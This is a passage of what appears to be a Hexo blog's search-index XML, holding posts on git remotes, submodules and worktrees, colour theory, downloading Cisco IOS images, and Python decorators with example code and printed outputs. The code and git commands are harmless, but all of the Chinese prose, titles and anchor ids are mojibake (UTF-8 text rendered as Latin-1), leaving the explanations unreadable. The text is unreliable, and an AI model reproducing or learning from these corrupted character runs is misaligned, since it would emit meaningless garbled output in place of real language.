·æ¯æ¬¡æäº¤å°±ä¸ä¼šå‡ºç°logsä¸‹é¢çš„æ–‡ä»¶äº†</span></code></pre></div></div><h2 id="å…³äºè¿œç¨‹çš„é—®é¢˜"><a href="#å…³äºè¿œç¨‹çš„é—®é¢˜" class="headerlink" title="å…³äºè¿œç¨‹çš„é—®é¢˜"></a>å…³äºè¿œç¨‹çš„é—®é¢˜</h2><p>å½“è¿œç«¯çš„å†å²å‘ç”Ÿå˜åŒ–ï¼Œè€Œè‡ªå·±è¿™ç«¯æäº¤æ–°å˜æ›´æ˜¯æäº¤ä¸ä¸Šçš„</p><p>è§£å†³åŠæ³•æ˜¯ä½¿ç”¨ <code>git fetch</code> ç„¶å <code>git rebase orign/master</code> ä¹Ÿå°±æ˜¯å°†masteråŸºå˜åˆ°orgin/masterä¸Š</p><p>ç®€å•çš„å†™æ³•ç›´æ¥æ˜¯<code>git pull --rebase</code></p><h3 id="è¿œç¨‹pushçš„åŒæ—¶å¯ä»¥åˆ›å»ºåˆ†æ”¯"><a href="#è¿œç¨‹pushçš„åŒæ—¶å¯ä»¥åˆ›å»ºåˆ†æ”¯" class="headerlink" title="è¿œç¨‹pushçš„åŒæ—¶å¯ä»¥åˆ›å»ºåˆ†æ”¯"></a>è¿œç¨‹pushçš„åŒæ—¶å¯ä»¥åˆ›å»ºåˆ†æ”¯</h3><p><code>git push origin &lt;branch&gt;:&lt;remoteNewBranch&gt;</code></p><h2 id="å­æ¨¡å—"><a href="#å­æ¨¡å—" class="headerlink" title="å­æ¨¡å—"></a>å­æ¨¡å—</h2><p>å½“æˆ‘ä»¬éœ€è¦æ‹†åˆ†ä¸€ä¸ªå¤§é¡¹ç›®ï¼Œæ¯”å¦‚ä¸€ä¸ªé¡¹ç›®æœ‰å¾ˆå¤šä¸ªæ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±çš„gitä»“åº“ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>git submodule add</code>æ¥æ·»åŠ æ¨¡å—</p><h2 id="worktree"><a href="#worktree" class="headerlink" title="worktree"></a>worktree</h2><p>å½“éœ€è¦é¢‘ç¹åˆ‡æ¢åˆ†æ”¯çš„æ—¶å€™ï¼Œä¼šé‡åˆ°åˆšåšäº†ä¸€ç‚¹ï¼Œä½†æ˜¯ä¸æƒ³æäº¤çš„æƒ…å†µï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨<code>git worktree add</code>æ¥åˆ›å»ºä¸€ä¸ªworktree</p><p>worktreeå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹ä¸åˆ†æ”¯ç»‘å®šåœ¨ä¸€èµ·ï¼Œè¿›å…¥äº†è¿™ä¸ªæ–‡ä»¶å¤¹åï¼Œgitçš„æ“ä½œå°±ä¼šå˜æˆåœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­è¿›è¡Œ</p><ul><li><p>åˆ›å»ºworktree<br><code>git worktree add &lt;worktree-name&gt; &lt;branch&gt;</code></p></li><li><p>åˆ‡æ¢åˆ°worktree<br><code>cd &lt;worktree-name&gt;</code></p></li><li><p>åˆ—å‡ºæ‰€æœ‰çš„worktree<br><code>git worktree list</code></p></li><li><p>åˆ é™¤worktree<br><code>git worktree remove &lt;worktree-name&gt;</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‰²å½©åŸç†</title>
      <link href="/2021/09/04/%E8%89%B2%E5%BD%A9%E5%8E%9F%E7%90%86/"/>
      <url>/2021/09/04/%E8%89%B2%E5%BD%A9%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="å†·æš–äº’è¡¥è‰²"><a href="#å†·æš–äº’è¡¥è‰²" class="headerlink" title="å†·æš–äº’è¡¥è‰²"></a>å†·æš–äº’è¡¥è‰²</h2><p>é¦–å…ˆï¼Œäººçš„çœ¼ç›æœ‰æ¬ºéª—æ€§ï¼Œä¼šå°†é¢œè‰²çš„ç°è‰²éƒ¨åˆ†è¿›è¡Œè¡¥è‰²å¤„ç†ï¼Œæˆ‘ä»¬ç”»ç”»è¦è¿½æ±‚è¿™æ ·æ•ˆæœï¼Œå°±è¦ä¸»åŠ¨çš„å°†ç°è‰²éƒ¨åˆ†è¿›è¡Œè¡¥è‰²å¤„ç†ã€‚</p><p>ç¬¬äºŒï¼Œè¦æ˜ç¡®çš„æ˜¯ï¼Œæ‰€è°“çš„æš—é¢ï¼Œå°±æ˜¯äº®é¢çš„ç°æš—é¢ï¼Œé‡Œé¢æœ‰ä¸ªå…³é”®ç‚¹æ˜¯ç°ã€‚</p><p>é‚£ä¹ˆä»€ä¹ˆå¯ä»¥è®©äº®é¢çš„é¢œè‰²äº§ç”Ÿç°è‰²å‘¢ï¼Ÿ ç­”æ¡ˆå°±æ˜¯è¡¥è‰²ã€‚</p><p>æ‰€ä»¥ï¼Œå°†äº®é¢çš„é¢œè‰²å’Œè¡¥è‰²è¿›è¡Œè°ƒå’Œï¼Œå°±å¾—åˆ°äº†è¶‹å‘ç°çš„ä¸­å’Œè‰²ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªä¸­å’Œè‰²æœ‰ä¸¤ä¸ªæ–¹å‘å¯ä»¥åˆ°è¾¾ï¼Œè¿™å°±æ˜¯ç›¸å¯¹å†·è¿˜æ˜¯ç›¸å¯¹æš–ã€‚</p><p><img src="/2021/09/04/%E8%89%B2%E5%BD%A9%E5%8E%9F%E7%90%86/1.png"></p><h2 id="å›ºæœ‰è‰²åŠ ä¸Šç¯å¢ƒå…‰"><a href="#å›ºæœ‰è‰²åŠ ä¸Šç¯å¢ƒå…‰" class="headerlink" title="å›ºæœ‰è‰²åŠ ä¸Šç¯å¢ƒå…‰"></a>å›ºæœ‰è‰²åŠ ä¸Šç¯å¢ƒå…‰</h2><p>é«˜æ˜åº¦ï¼Œé«˜</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cisco IOS ä¸‹è½½</title>
      <link href="/2021/08/26/Cisco-IOS-%E4%B8%8B%E8%BD%BD/"/>
      <url>/2021/08/26/Cisco-IOS-%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p>ä¸‹è½½æ€ç§‘çš„IOSï¼Œå¯ä»¥åœ¨å®˜ç½‘çš„<a href="https://software.cisco.com/download">è½¯ä»¶ä¸‹è½½å¤„</a>ä¸‹è½½</p><p>ä½†æ˜¯ï¼Œæœ‰ä¸€äº›IOSå› ä¸ºå¤ªè€äº†ï¼Œåœ¨å®˜ç½‘ä¸Šå·²ç»æ‰¾ä¸åˆ°äº†ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ (<a href="https://tfr.org/cisco-ios/">https://tfr.org/cisco-ios/</a>) è¿™é‡Œæ‰¾ä¸€æ‰¾ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°é€š </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python è£…é¥°å™¨è¯¦è§£</title>
      <link href="/2021/08/25/python-%E8%A3%85%E9%A5%B0%E5%99%A8%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/08/25/python-%E8%A3%85%E9%A5%B0%E5%99%A8%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>æ‰€è°“è£…é¥°å™¨ï¼Œå°±æ˜¯åœ¨å‡½æ•°è¿è¡Œå‰è¿è¡Œçš„ä¸€ä¸ªå‡½æ•°ã€‚</p><p>å…¶ä¸­å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»çš„ä½¿ç”¨æ€è·¯ï¼š</p><ol><li>ä»¥è£…é¥°å™¨åŒ…è£¹ä½ä¸»ä½“å‡½æ•°</li><li>ä»¥ä¸»ä½“å‡½æ•°åŒ…è£¹ä½è£…é¥°å™¨</li></ol><p>è£…é¥°å™¨çš„æœ¬è´¨å°±æ˜¯<code>@magic  == (extend = magic(extend))</code></p><p>æŒ‰ç…§pythonçš„è®¾è®¡æ€è·¯ï¼Œå…¶å®åº”è¯¥å¤šç”¨è£…é¥°å™¨æ–¹æ³•ï¼Œå°‘ç”¨ç±»</p><ul><li><a href="https://github.com/tiangolo/typer">Typer</a>è¿™ä¸ªåº“éå¸¸å¥½çš„ä½¿ç”¨äº†è£…é¥°å™¨ï¼Œå¯ä»¥åšä¸ºå‚è€ƒ</li></ul><h2 id="ä»¥è£…é¥°å™¨åŒ…è£¹ä½ä¸»ä½“å‡½æ•°çš„åŸºæœ¬å‹"><a href="#ä»¥è£…é¥°å™¨åŒ…è£¹ä½ä¸»ä½“å‡½æ•°çš„åŸºæœ¬å‹" class="headerlink" title="ä»¥è£…é¥°å™¨åŒ…è£¹ä½ä¸»ä½“å‡½æ•°çš„åŸºæœ¬å‹"></a>ä»¥è£…é¥°å™¨åŒ…è£¹ä½ä¸»ä½“å‡½æ•°çš„åŸºæœ¬å‹</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">@magic</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend</span>()</span></span></code></pre></div></div><p>è¿™ä¸ªè£…é¥°å™¨å…¶å®è¿è¡Œçš„å°±æ˜¯å°†ä¸‹é¢ä¸¤è¡Œæ•´åˆäº†</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-py codeBlockLines"><span class="line">extend = magic(extend)</span><span class="line">extend()</span></code></pre></div></div><p>æ‰€ä»¥å¯ä»¥æ¨å¯¼å‡ºè£…é¥°å™¨çš„åŸºæœ¬å‹</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment"># è£…é¥°å™¨åŸºæœ¬å‹</span></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in magic&#x27;</span>)</span><span class="line">    <span class="hljs-keyword">return</span> func</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@magic  </span><span class="hljs-comment"># extend_magic = magic(extend_magic)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend_magic</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in extend_magic&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line">extend_magic</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#output:</span></span><span class="line"><span class="hljs-comment">#in magic</span></span></code></pre></div></div><p>ä»è¿™ä¸ªåŸºæœ¬å‹å¯ä»¥çœ‹å‡ºï¼Œåœ¨æ²¡æœ‰æ‰§è¡Œå‡½æ•°çš„æ—¶å€™ï¼Œå…¶å®æ˜¯å·²ç»æ‰§è¡Œäº†<code>magic(func)</code>çš„ã€‚</p><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬æƒ³åœ¨æ²¡æœ‰æ‰§è¡Œ<code>extend_magic</code>çš„æ—¶å€™ï¼Œä¸è¦æ‰§è¡Œ<code>magic</code>ä¸­çš„å†…å®¹è¦å¦‚ä½•å‘¢ï¼Ÿ</p><h3 id="ä¸é¢„æ‰§è¡Œmagic"><a href="#ä¸é¢„æ‰§è¡Œmagic" class="headerlink" title="ä¸é¢„æ‰§è¡Œmagic"></a>ä¸é¢„æ‰§è¡Œmagic</h3><p>ä¿®æ”¹magicå‡½æ•°ä¸º:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>():</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in magic&#x27;</span>)</span><span class="line">        func()</span><span class="line">    <span class="hljs-keyword">return</span> _</span></code></pre></div></div><p>è¿™æ ·æ‰€è°“çš„é—­åŒ…ï¼Œåœ¨æ²¡æœ‰æ‰§è¡Œçš„æ—¶å€™ï¼Œè¿”å›çš„å°±åªæ˜¯<code>_</code>è¿™ä¸ªå‡½æ•°ã€‚<br>æ‰€ä»¥æ‰§è¡Œ<code>extend_magic()</code>åçš„ç»“æœä¸ºï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">in magic</span></span><span class="line"><span class="hljs-attribute">in extend_magic</span></span></code></pre></div></div><blockquote><p>è¦ä»”ç»†ç†è§£è¿™é‡Œçš„<code>return</code>, ç†è§£äº†è¿™é‡Œå°±å¯ä»¥ç†è§£<code>@property</code>è£…é¥°å™¨ã€‚<a href="/2022/03/10/python-%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%AF%A6%E8%A7%A3/" title="python æè¿°ç¬¦è¯¦è§£">python æè¿°ç¬¦è¯¦è§£</a></p></blockquote><h2 id="ä»¥ä¸»ä½“å‡½æ•°åŒ…è£¹ä½è£…é¥°å™¨çš„åŸºæœ¬å‹"><a href="#ä»¥ä¸»ä½“å‡½æ•°åŒ…è£¹ä½è£…é¥°å™¨çš„åŸºæœ¬å‹" class="headerlink" title="ä»¥ä¸»ä½“å‡½æ•°åŒ…è£¹ä½è£…é¥°å™¨çš„åŸºæœ¬å‹"></a>ä»¥ä¸»ä½“å‡½æ•°åŒ…è£¹ä½è£…é¥°å™¨çš„åŸºæœ¬å‹</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in magic&#x27;</span>)</span><span class="line">    func()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend_magic</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in extend_magic&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @magic</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend</span>():</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in extend&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line">extend_magic()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#in extend_magic</span></span><span class="line"><span class="hljs-comment">#in magic</span></span><span class="line"><span class="hljs-comment">#in extend</span></span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§ä½¿ç”¨æ–¹å¼å°±å¯ä»¥è®©è£…é¥°å™¨åœ¨å‡½æ•°ä¸­é—´çš„æŸä¸ªåœ°æ–¹æ‰§è¡Œï¼Œå¹¶ä¸”æ²¡æœ‰ä½¿ç”¨é—­åŒ…çš„æ–¹å¼ï¼Œå› ä¸ºå¯ä»¥ä¸ç”¨æ‹…å¿ƒåœ¨åªè°ƒç”¨å¯¹è±¡çš„è€Œä¸æ‰§è¡Œçš„åœ°æ–¹é”™è¯¯çš„æ‰§è¡Œ<code>magic</code>å‡½æ•°ã€‚</p><h3 id="ä¸»å‡½æ•°å¸¦å‚æ•°çš„åŸºæœ¬å‹"><a href="#ä¸»å‡½æ•°å¸¦å‚æ•°çš„åŸºæœ¬å‹" class="headerlink" title="ä¸»å‡½æ•°å¸¦å‚æ•°çš„åŸºæœ¬å‹"></a>ä¸»å‡½æ•°å¸¦å‚æ•°çš„åŸºæœ¬å‹</h3><p>ä¸Šé¢çš„åŸºæœ¬å‹æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ‰§è¡Œè¯­å¥<code>func()</code>åœ¨è£…é¥°å™¨ä¸­ï¼Œæ˜¯ä¸å¸¦å‚æ•°çš„ï¼Œé‚£ä¹ˆè¦å¸¦å‚æ•°åº”è¯¥å¦‚ä½•å‘¢ï¼Ÿ</p><p><del>åŸºæœ¬æƒ³æ³•æ˜¯å°†ä¸»å‡½æ•°çš„å±æ€§å¤åˆ¶åˆ°è£…é¥°å™¨ä¸­ã€‚</del><br><del>è¿™é‡Œå°±è¦å¼•å…¥<code>from functools import wraps</code>ï¼Œè¿™ä¸ªåŒ…è£…å™¨äº†ï¼Œä½œç”¨å°±æ˜¯å¤åˆ¶åŸå‡½æ•°çš„å±æ€§ï¼Œå½“ç„¶ä¹Ÿå°±åŒ…å«äº†å‚æ•°å€¼ã€‚</del></p><ul><li><a href="https://zhuanlan.zhihu.com/p/45535784">wraps åŸç†</a></li></ul><p>python3åå¯ä»¥ä¸éœ€è¦å¼•å…¥wrpasåŒ…ï¼Œä¹Ÿèƒ½è·å–åˆ°å‡½æ•°çš„å‚æ•°å€¼</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kargs</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">        func(*args, **kargs)</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">a, b</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call func, sum: &quot;</span>, <span class="hljs-built_in">sum</span>((a, b)))</span><span class="line"></br></span><span class="line">func(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#init first method</span></span><span class="line"><span class="hljs-comment">#call first method start</span></span><span class="line"><span class="hljs-comment">#call func, sum:  3</span></span><span class="line"><span class="hljs-comment">#call first method end</span></span></code></pre></div></div><p>ç­‰ä»·åŸå‹ä¸º</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">first(func)(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></code></pre></div></div><p>å›ºå®šç”¨æ³•ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">    <span class="hljs-keyword">return</span> func(*args, **kwargs)</span><span class="line"><span class="hljs-keyword">return</span> _</span></code></pre></div></div><h2 id="å¤šè£…é¥°å™¨çš„æ‰§è¡Œé¡ºåº"><a href="#å¤šè£…é¥°å™¨çš„æ‰§è¡Œé¡ºåº" class="headerlink" title="å¤šè£…é¥°å™¨çš„æ‰§è¡Œé¡ºåº"></a>å¤šè£…é¥°å™¨çš„æ‰§è¡Œé¡ºåº</h2><p>é¢„æ‰§è¡Œé¡ºåºæ˜¯ç”±å†…è€Œå¤–çš„ï¼Œç†è§£çš„æ˜¯è·ç¦»ä¸»ä½“è¶Šè¿‘è¶Šæå‰æ‰§è¡Œã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">func</span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>():</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">        func()</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">second</span>(<span class="hljs-params">func</span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init second method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>():</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call second method start&quot;</span>)</span><span class="line">        func()</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call second method end&quot;</span>)</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first</span></span><span class="line"><span class="hljs-meta">@second</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call func&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start program&quot;</span>)</span><span class="line"></br></span><span class="line">func()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#init second method</span></span><span class="line"><span class="hljs-comment">#init first method</span></span><span class="line"><span class="hljs-comment">#start program</span></span><span class="line"><span class="hljs-comment">#call first method start</span></span><span class="line"><span class="hljs-comment">#call second method start</span></span><span class="line"><span class="hljs-comment">#call func</span></span><span class="line"><span class="hljs-comment">#call second method end</span></span><span class="line"><span class="hljs-comment">#call first method end</span></span></code></pre></div></div><p>ç­‰ä»·åŸå‹ä¸ºï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">first(second(func))()</span></code></pre></div></div><h2 id="å¸¦å‚æ•°çš„è£…é¥°å™¨çš„åŸºæœ¬å‹"><a href="#å¸¦å‚æ•°çš„è£…é¥°å™¨çš„åŸºæœ¬å‹" class="headerlink" title="å¸¦å‚æ•°çš„è£…é¥°å™¨çš„åŸºæœ¬å‹"></a>å¸¦å‚æ•°çš„è£…é¥°å™¨çš„åŸºæœ¬å‹</h2><p>ç°åœ¨ï¼Œæƒ³è¦å¯¹è£…é¥°å™¨åŠ ä¸Šå‚æ•°ï¼Œå¦‚ä½•åšã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ï¼Œå¸¦å‚æ•°çš„è£…é¥°å™¨ä¸ä¸å¸¦å‚æ•°çš„è£…é¥°å™¨ï¼Œåœ¨è¡Œä¸ºä¸Šæ˜¯ä¸ä¸€æ ·çš„ã€‚</p><p>ä¸å¸¦å‚æ•°çš„è£…é¥°å™¨æ˜¯è¿™æ ·çš„ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">@decorate</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    <span class="hljs-keyword">pass</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment">#ç­‰æ•ˆ</span></span><span class="line"></br></span><span class="line">func = decorate(func)</span></code></pre></div></div><p>è€Œå¸¦å‚æ•°çš„è£…é¥°å™¨æ˜¯è¿™æ ·çš„ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">@decorate(<span class="hljs-params">a,b</span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    <span class="hljs-keyword">pass</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># ç­‰æ•ˆ</span></span><span class="line"></br></span><span class="line">func = decorate(a,b)(func)</span></code></pre></div></div><p>ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼Œå¸¦å‚æ•°çš„å…¶å®ç»è¿‡äº†ä¸¤æ¬¡è°ƒç”¨ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬ä¹Ÿå¿…é¡»è¦è£…é¥°å™¨ä¸­ç»™å‡ºä¸¤æ¬¡è°ƒç”¨ã€‚</p><p>æ‰€ä»¥åŸºæœ¬å‹æ˜¯å¦‚ä¸‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">a, b</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first_wrapper method&quot;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>():</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first method args: &quot;</span>, a, b)</span><span class="line">            func()</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">        <span class="hljs-keyword">return</span> _</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first(<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call func&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;== start program ==&quot;</span>)</span><span class="line"></br></span><span class="line">func()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#init first method</span></span><span class="line"><span class="hljs-comment">#init first_wrapper method</span></span><span class="line"><span class="hljs-comment">#== start program ==</span></span><span class="line"><span class="hljs-comment">#call first method start</span></span><span class="line"><span class="hljs-comment">#first method args:  1 2</span></span><span class="line"><span class="hljs-comment">#call func</span></span><span class="line"><span class="hljs-comment">#call first method end</span></span></code></pre></div></div><p>ç­‰æ•ˆäº</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">first(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(func)()</span></code></pre></div></div><h2 id="ä¸»å‡½æ•°ä¸è£…é¥°å™¨éƒ½æœ‰å‚æ•°"><a href="#ä¸»å‡½æ•°ä¸è£…é¥°å™¨éƒ½æœ‰å‚æ•°" class="headerlink" title="ä¸»å‡½æ•°ä¸è£…é¥°å™¨éƒ½æœ‰å‚æ•°"></a>ä¸»å‡½æ•°ä¸è£…é¥°å™¨éƒ½æœ‰å‚æ•°</h2><p>è¦æƒ³éƒ½æœ‰å‚æ•°ï¼Œå…¶å®å’Œä¸Šé¢å·²ç»ä¸€æ ·äº†ï¼Œåªæ˜¯å¤šå‡ºäº†è°ƒç”¨å‚æ•°çš„ç¯èŠ‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">a, b</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first_wrapper method&quot;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first method args: &quot;</span>, a, b)</span><span class="line">            func(*args, **kwargs)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">        <span class="hljs-keyword">return</span> _</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span 